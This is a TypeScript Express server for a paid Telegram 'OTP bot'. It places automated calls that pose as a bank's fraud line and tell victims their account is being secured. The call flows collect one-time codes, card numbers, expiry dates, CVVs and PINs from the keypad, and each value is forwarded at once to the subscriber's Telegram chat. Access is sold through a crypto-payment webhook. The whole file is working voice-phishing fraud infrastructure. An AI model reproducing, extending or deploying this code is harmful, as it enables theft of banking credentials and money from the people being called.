/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable no-console */
import { Webhook } from 'coinbase-commerce-node';
import express from 'express';
import moment from 'moment';
import { Markup } from 'telegraf';
import { v4 as uuidv4 } from 'uuid';
import { bot } from '.';
import { client } from './utils/contentful';
import { accountFlow, bankFlow, cardFlow, payFlow } from './utils/dtmfFlow';
import { getMembership } from './utils/getMembership';
import { getUser } from './utils/getUser';

const app = express();

app.use(express.json());
app.use(
  express.urlencoded({
    extended: true,
  }),
);

app.post('/coinbase-webhook', async (req, res) => {
  const body = req.body;
  const signature = req.headers['x-cc-webhook-signature'] as string;
  const webhookSecret = process.env.COINBASE_WEBHOOK_SECRET as string;

  try {
    const event = Webhook.verifyEventBody(
      JSON.stringify(body),
      signature,
      webhookSecret,
    );

    const { metadata, pricing } = body.event.data;
    const subsciption = getMembership(pricing.local.amount);

    if (event.type === 'charge:pending' && metadata.reason === 'OTP Purchase') {
      // user paid, but transaction not confirm on blockchain yet
      bot.telegram.sendMessage(
        metadata.chatId,
        '😁 Your payment has been received but not confirmed yet ',
      );
    }

    if (
      (event.type === 'charge:confirmed' &&
        metadata.reason === 'OTP Purchase') ||
      (event.type === 'charge:resolved' && metadata.reason === 'OTP Purchase')
    ) {
      // all good, charge confirmed
      bot.telegram.sendMessage(
        metadata.chatId,
        '😋 Your payment has been received',
      );
      try {
        const { user } = await getUser({
          id: Number(metadata.chatId),
        });

        if (user) {
          user.fields.membershipExpiry = {
            'en-US': moment
              .utc()
              .add(subsciption.duration, subsciption.unit as any)
              .format(),
          };

          await (await user.update()).publish();

          await bot.telegram.sendMessage(
            metadata.chatId,
            '🤩 Your subsciption has been renewed, to start send "/call"',
          );
        }
      } catch (error) {
        const space = await client.getSpace(
          process.env.CONTENTFUL_SPACE as string,
        );
        const env = await space.getEnvironment('master');
        const user = await env.createEntry('user', {
          fields: {
            id: { 'en-US': Date.now() },
            telegramId: { 'en-US': Number(metadata.chatId) },
            username: { 'en-US': metadata.username },
            membershipExpiry: {
              'en-US': moment
                .utc()
                .add(subsciption.duration, subsciption.unit as any)
                .format(),
            },
            membershipType: {
              'en-US': subsciption.type,
            },
          },
        });

        await user.publish();

        await bot.telegram.sendMessage(
          metadata.chatId,
          '🤩 Your subsciption has been confirmed, to start send "/call"',
        );
      }
    }

    if (event.type === 'charge:failed' && metadata.reason === 'OTP Purchase') {
      // charge failed or expired
      bot.telegram.sendMessage(
        metadata.chatId,
        "😔 You didn't make a payment if this an error please contact admin",
      );
    }

    res.send(`success ${event.id}`);
  } catch (error) {
    console.log(error);
    res.status(400).send('failure!');
  }
});

app.get('/calls/dtmf/:language/:step/:chatId', (req, res) => {
  const { step, language, chatId } = req.params;
  const { wallet, askCardInfo, cardType, variables, destination } = req.query;

  const { dtmf } = JSON.parse(variables as string);

  switch (step) {
    case 'bank':
      bankFlow(
        String(dtmf),
        res,
        language,
        Number(chatId),
        step,
        destination as string,
      );

      break;
    case 'pay':
      payFlow(
        String(dtmf),
        res,
        language,
        Number(chatId),
        step,
        destination as string,
        wallet as string,
      );
      break;
    case 'account':
      accountFlow(
        String(dtmf),
        res,
        language,
        Number(chatId),
        step,
        destination as string,
        askCardInfo as string,
      );
      break;
    case 'card':
      cardFlow(
        String(dtmf),
        res,
        language,
        Number(chatId),
        step,
        destination as string,
        cardType as string,
      );
      break;
    default:
      break;
  }
});

app.get('/calls/pin/:chatId/:language', async (req, res) => {
  const { chatId, language } = req.params;
  const { variables } = req.query;
  const { dtmf } = JSON.parse(variables as string);

  if (dtmf && dtmf === '*') {
    await bot.telegram.sendMessage(
      chatId,
      `OTP not received ❌\n\nCall again`,
      {
        parse_mode: 'HTML',
        reply_markup: Markup.inlineKeyboard([
          Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
          Markup.button.callback('👎🏽 No', 'noCallAgain'),
        ]).reply_markup,
      },
    );

    return res.json({
      id: uuidv4(),
      title: `call bank - ${chatId} no OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              'OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.',
            language,
            voice: 'female',
          },
        },
        // {
        //   id: uuidv4(),
        //   action: 'hangup',
        // },
      ],
    });
  }
  if (dtmf) {
    await bot.telegram.sendMessage(
      req.params.chatId,
      req.params.language === 'en-us'
        ? `Card Pin is <b>${dtmf}</b> 💳`
        : `Telepin is <b>${dtmf}</b> 📟`,
      {
        parse_mode: 'HTML',
      },
    );
  }
  return res.json({
    id: uuidv4(),
    title: `call bank - ${chatId} no OTP`,
    record: false,
    steps: [
      {
        id: uuidv4(),
        action: 'say',
        options: {
          payload: `GREAT, you have entered ${dtmf
            .split('')
            .join(
              ' ',
            )}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
          language,
          voice: 'female',
        },
      },
      // {
      //   id: uuidv4(),
      //   action: 'hangup',
      // },
    ],
  });
});

app.get('/calls/card/:chatId/:language', async (req, res) => {
  const { cardType, isAccount, expiry, cvv } = req.query;
  const { variables } = req.query;
  const { dtmf } = JSON.parse(variables as string);

  const { language, chatId } = req.params;

  if (isAccount === 'yes') {
    if (dtmf) {
      await bot.telegram.sendMessage(chatId, `Card number <b>${dtmf}</b> ✅`, {
        parse_mode: 'HTML',
      });
    }
    res.json({
      id: uuidv4(),
      title: `call card - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `GREAT, you have entered ${dtmf
              .split('')
              .join(' ')}. Please enter your ${
              cardType !== 'undefined' ? cardType : ''
            } card expirattion date followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'cardStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/card/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
          },
        },
      ],
    });
  }

  if (expiry === 'yes') {
    if (dtmf) {
      await bot.telegram.sendMessage(
        chatId,
        `Expiration date <b>${dtmf}</b> ✅`,
        {
          parse_mode: 'HTML',
        },
      );
    }

    res.json({
      id: uuidv4(),
      title: `call card - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `GREAT, you have entered ${dtmf
              .split('')
              .join(' ')}. Please enter your ${
              cardType !== 'undefined' ? cardType : ''
            } card CVV followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'cardStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/card/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
          },
        },
      ],
    });
  }

  if (cvv === 'yes') {
    if (dtmf) {
      await bot.telegram.sendMessage(chatId, `CVV <b>${dtmf}</b> ✅`, {
        parse_mode: 'HTML',
      });
    }
    return res.json({
      id: uuidv4(),
      title: `call card - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `GREAT. you have entered ${dtmf
              .split('')
              .join(' ')}. To AUTHENTICATE YOU please enter your ${
              language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
            } followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'cardStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
          },
        },
      ],
    });
  }
});

app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
  const { askCardInfo, cardType, variables } = req.query;
  console.log('req.query: ', req.query);

  const { language, chatId, step } = req.params;

  const { dtmf } = JSON.parse(variables as string);

  if (dtmf && dtmf === '*') {
    await bot.telegram.sendMessage(
      chatId,
      `OTP not received ❌\n\nCall again`,
      {
        parse_mode: 'HTML',
        reply_markup: Markup.inlineKeyboard([
          Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
          Markup.button.callback('👎🏽 No', 'noCallAgain'),
        ]).reply_markup,
      },
    );

    return res.json({
      id: uuidv4(),
      title: `call bank - ${chatId} no OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              'OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.',
            language,
            voice: 'female',
          },
        },
        // {
        //   id: uuidv4(),
        //   action: 'hangup',
        // },
      ],
    });
  }

  switch (step) {
    case 'bank':
      if (dtmf) {
        await bot.telegram.sendMessage(
          req.params.chatId,
          `OTP is <b>${dtmf}</b> ✅`,
          {
            parse_mode: 'HTML',
          },
        );
      }
      return res.json({
        id: uuidv4(),
        title: `call bank - ${chatId} OTP`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `GREAT. you have entered ${dtmf
                .split('')
                .join(' ')}. To AUTHENTICATE YOU please enter your ${
                language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
              } followed by the pound key.`,
              language,
              voice: 'female',
            },
            onKeypressGoto: 'bankStepPin',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'bankStepPin',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'bankStepPin',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
            },
          },
        ],
      });
    case 'pay':
      if (dtmf) {
        await bot.telegram.sendMessage(
          req.params.chatId,
          `OTP is <b>${dtmf}</b> ✅`,
          {
            parse_mode: 'HTML',
          },
        );
      }

      return res.json({
        id: uuidv4(),
        title: `call card - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `GREAT. you have entered ${dtmf
                .split('')
                .join(' ')}. To AUTHENTICATE YOU please enter your ${
                language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
              } followed by the pound key.`,
              language,
              voice: 'female',
              length: 5,
              loop: true,
            },
            onKeypressGoto: 'cardStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'cardStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'cardStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
            },
          },
        ],
      });
    case 'account':
      if (dtmf) {
        await bot.telegram.sendMessage(
          req.params.chatId,
          `OTP is <b>${dtmf}</b> ✅`,
          {
            parse_mode: 'HTML',
          },
        );
      }

      if (askCardInfo === 'yes') {
        return res.json({
          id: uuidv4(),
          title: `call card - ${chatId}`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `Okay, you have entered ${dtmf
                  .split('')
                  .join(' ')}. We need to verify you, please enter your ${
                  cardType !== 'undefined' ? cardType : ''
                } card number followed by the pound key`,
                language,
                voice: 'female',
                length: 5,
                loop: true,
              },
              onKeypressGoto: 'cardStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'cardStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              id: 'cardStepGoto',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/card/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
              },
            },
          ],
        });
      } else {
        return res.json({
          id: uuidv4(),
          title: `call bank - ${chatId} no OTP`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `GREAT, you have entered ${dtmf
                  .split('')
                  .join(
                    ' ',
                  )}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
                language,
                voice: 'female',
              },
            },
            // {
            //   id: uuidv4(),
            //   action: 'hangup',
            // },
          ],
        });
      }
    case 'card':
      if (dtmf) {
        await bot.telegram.sendMessage(
          req.params.chatId,
          `Card number <b>${dtmf}</b> ✅`,
          {
            parse_mode: 'HTML',
          },
        );
        return res.json({
          id: uuidv4(),
          title: `call card - ${chatId}`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `GREAT, you have entered ${dtmf
                  .split('')
                  .join(
                    ' ',
                  )}. Please enter your ${cardType} card expiry date followed by the pound key.`,
                language,
                voice: 'female',
                length: 5,
                loop: true,
              },
              onKeypressGoto: 'cardStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 6,
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'cardStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 6,
            },
            {
              id: 'cardStepGoto',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
              },
            },
          ],
        });
      } else {
        return res.json({
          id: uuidv4(),
          title: `call card - ${chatId}`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key`,
                language,
                voice: 'female',
                length: 5,
                loop: true,
              },
              onKeypressGoto: 'cardStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'cardStepGoto',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              id: 'cardStepGoto',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
              },
            },
          ],
        });
      }
    default:
      break;
  }
});
app.post('/calls/:chatId', async (req, res) => {
  const { chatId } = req.params;
  // const { status, to } = req.body;
  // console.log('payload: ', req.body.items[0].payload);
  const { status, destination, webhook, Status } = req.body.items[0].payload;

  if ((!chatId || !webhook) && !Status) {
    return res.send('success');
  }

  if (status === 'ringing' || status === 'starting') {
    await bot.telegram.sendMessage(chatId, `Ringing (${destination}) 🔔`);
  }

  if (status === 'busy') {
    await bot.telegram.sendMessage(
      chatId,
      '<b>On another call </b> ❌\n\nCall again',
      {
        parse_mode: 'HTML',
        reply_markup: Markup.inlineKeyboard([
          Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
          Markup.button.callback('👎🏽 No', 'noCallAgain'),
        ]).reply_markup,
      },
    );
  }

  if (Status === 'MACHINE') {
    await bot.telegram.sendMessage(chatId, '<b>Voicemail</b> ❌', {
      parse_mode: 'HTML',
    });
  }

  if (status === 'cancelled') {
    await bot.telegram.sendMessage(
      chatId,
      'Call could not be placed, the number is unreachable ❌.',
    );

    await bot.context.scene?.enter('super-wizard');
  }

  if (status === 'failed' || status === 'declined') {
    await bot.telegram.sendMessage(chatId, '<b>Hang up</b> ❌\n\nCall again', {
      parse_mode: 'HTML',
      reply_markup: Markup.inlineKeyboard([
        Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
        Markup.button.callback('👎🏽 No', 'noCallAgain'),
      ]).reply_markup,
    });
  }

  if (status === 'no_answer' || status === 'timeout') {
    await bot.telegram.sendMessage(
      chatId,
      '<b>No answer</b> ❌\n\nCall again',
      {
        parse_mode: 'HTML',
        reply_markup: Markup.inlineKeyboard([
          Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
          Markup.button.callback('👎🏽 No', 'noCallAgain'),
        ]).reply_markup,
      },
    );
  }

  // if (status === 'failed') {
  //   await bot.telegram.sendMessage(
  //     chatId,
  //     '😔💔 Bot is down and will back soon.\n\nPlease contact admin to follow up.',
  //     {
  //       parse_mode: 'HTML',
  //       reply_markup: Markup.inlineKeyboard([
  //         Markup.button.callback('Try again', 'start'),
  //       ]).reply_markup,
  //     },
  //   );

  //   await bot.context.scene?.enter('super-wizard');
  // }
  if (status === 'ended') {
    await bot.telegram.sendMessage(chatId, '<b>Ended.</b>.\n\nCall again? 📞', {
      parse_mode: 'HTML',
      reply_markup: Markup.inlineKeyboard([
        Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
        Markup.button.callback('👎🏽 No', 'noCallAgain'),
      ]).reply_markup,
    });
  }
  res.send('success');
});

const port = process.env.PORT || 4040;

app.get('/', (_, res) => {
  res.send('Hello World!');
});

app.listen(port, () =>
  // eslint-disable-next-line no-console
  console.log(`⚡⚡⚡ Server has started on http://localhost:${port}`),
);
